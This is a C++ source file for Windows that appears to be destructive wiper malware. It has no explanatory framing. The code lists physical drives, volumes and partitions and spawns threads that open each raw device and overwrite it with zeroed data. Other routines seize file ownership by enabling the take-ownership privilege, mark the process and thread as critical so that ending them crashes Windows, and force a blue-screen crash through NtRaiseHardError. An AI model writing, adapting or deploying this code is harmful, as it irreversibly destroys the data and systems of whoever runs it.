#include "destruction.h"

long long FileNum = 0;
LPCSTR overwrite[] = {
    "\\\\.\\PhysicalDrive0",
    "\\\\.\\PhysicalDrive1",
    "\\\\.\\PhysicalDrive2",
    "\\\\.\\C:",
    "\\\\.\\D:",
    "\\\\.\\E:",
    "\\\\.\\Harddisk0Partition1",
    "\\\\.\\Harddisk0Partition2",
    "\\\\.\\Harddisk0Partition3",
    "\\\\.\\Harddisk0Partition4",
    "\\\\.\\Harddisk0Partition5",
    "\\\\.\\Harddisk1Partition1",
    "\\\\.\\Harddisk1Partition2",
    "\\\\.\\Harddisk1Partition3",
    "\\\\.\\Harddisk1Partition4",
    "\\\\.\\Harddisk1Partition5",
    "\\\\.\\Harddisk2Partition1",
    "\\\\.\\Harddisk2Partition2",
    "\\\\.\\Harddisk2Partition3",
    "\\\\.\\Harddisk2Partition4",
    "\\\\.\\Harddisk2Partition5"
};
const size_t nOverwrite = sizeof(overwrite) / sizeof(void*);
bool SetPrivilege(HANDLE hToken, LPCSTR lpszPrivilege, bool bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueA(NULL, lpszPrivilege, &luid)) {
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege) {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else {
        tp.Privileges[0].Attributes = 0;
    }

    if (!AdjustTokenPrivileges(hToken, false, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        return false;
    }

    return true;
}

bool TakeOwnership(LPSTR lpszOwnFile) {
    bool bRetval = false;

    HANDLE hToken = NULL;
    PSID pSIDAdmin = NULL;
    PSID pSIDEveryone = NULL;
    PACL pACL = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld =
        SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
    const int NUM_ACES = 2;
    EXPLICIT_ACCESSA ea[NUM_ACES];
    DWORD dwRes;

    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) {
        goto Cleanup;
    }

    if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin)) {
        goto Cleanup;
    }

    ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESSA));

    ea[0].grfAccessPermissions = GENERIC_READ;
    ea[0].grfAccessMode = SET_ACCESS;
    ea[0].grfInheritance = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].Trustee.ptstrName = (LPSTR)pSIDEveryone;

    ea[1].grfAccessPermissions = GENERIC_ALL;
    ea[1].grfAccessMode = SET_ACCESS;
    ea[1].grfInheritance = NO_INHERITANCE;
    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    ea[1].Trustee.ptstrName = (LPSTR)pSIDAdmin;

    if (ERROR_SUCCESS != SetEntriesInAclA(NUM_ACES, ea, NULL, &pACL)) {
        goto Cleanup;
    }

    dwRes = SetNamedSecurityInfoA(lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

    if (ERROR_SUCCESS == dwRes) {
        bRetval = true;
        goto Cleanup;
    }

    if (dwRes != ERROR_ACCESS_DENIED) {
        goto Cleanup;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        goto Cleanup;
    }

    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, true)) {
        goto Cleanup;
    }

    dwRes = SetNamedSecurityInfoA(lpszOwnFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL);

    if (dwRes != ERROR_SUCCESS) {
        goto Cleanup;
    }

    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false)) {
        goto Cleanup;
    }

    dwRes = SetNamedSecurityInfoA(lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

    if (dwRes == ERROR_SUCCESS) {
        bRetval = true;
    }

Cleanup:

    if (pSIDAdmin)
        FreeSid(pSIDAdmin);

    if (pSIDEveryone)
        FreeSid(pSIDEveryone);

    if (pACL)
        LocalFree(pACL);

    if (hToken)
        CloseHandle(hToken);

    return bRetval;
}

void SetCriticalProcess() {
    HANDLE hToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);

    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    VOID(WINAPI * RtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN) = (VOID(WINAPI * )(BOOLEAN, PBOOLEAN, BOOLEAN))GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
    VOID(WINAPI * RtlSetThreadIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN) = (VOID(WINAPI*)(BOOLEAN, PBOOLEAN, BOOLEAN))GetProcAddress(hNtdll, "RtlSetThreadIsCritical");

    SetPrivilege(hToken, SE_DEBUG_NAME, true);
    if (RtlSetProcessIsCritical && RtlSetThreadIsCritical) {
        RtlSetProcessIsCritical(true, NULL, false);
        RtlSetThreadIsCritical(true, NULL, false);
    }
}
void OverWrite(LPCSTR Name) {  // Change LPCWSTR to LPCSTR
    HANDLE hFile = CreateFileA(Name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);  // Use CreateFileA

    unsigned char* EmptyData = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 2147483647);
    DWORD dwUnused;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    for (int i = 0; i < 50000; i++) {
        WriteFile(hFile, EmptyData, 2147483647, &dwUnused, NULL);
    }

    CloseHandle(hFile);
    LocalFree(EmptyData);
}

void OverWriteDisk() {
    // Assuming overwrite is an array of multibyte strings (LPCSTR)
    for (int i = 0; i < nOverwrite; i++) {
        CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(OverWrite), (PVOID)overwrite[i], 0, NULL);
        Sleep(10);
    }
}
void CrashOS() {
    HMODULE hNtdll = LoadLibrary("ntdll.dll");
    VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");
    
    unsigned char unused1;
    long unsigned int unused2;

    if (RtlAdjustPrivilege && NtRaiseHardError) {
        RtlAdjustPrivilege(0x13, true, false, &unused1);
        NtRaiseHardError(0xdeaddead, 0, 0, 0, 6, &unused2);
    }

    FreeLibrary(hNtdll);

    ExitWindows();

    ExitProcess(0);
}